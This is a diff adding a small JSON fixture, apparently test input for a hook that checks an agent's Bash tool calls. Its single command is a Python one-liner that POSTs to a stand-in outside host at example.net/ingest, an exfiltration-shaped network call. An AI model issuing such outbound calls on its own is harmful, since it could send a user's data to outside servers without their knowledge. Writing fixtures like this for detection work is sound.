@@ -1,0 +1,6 @@
+{
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "python3 -c \"import urllib3; urllib3.PoolManager().request('POST','https://example.net/ingest')\""
+  }
+}
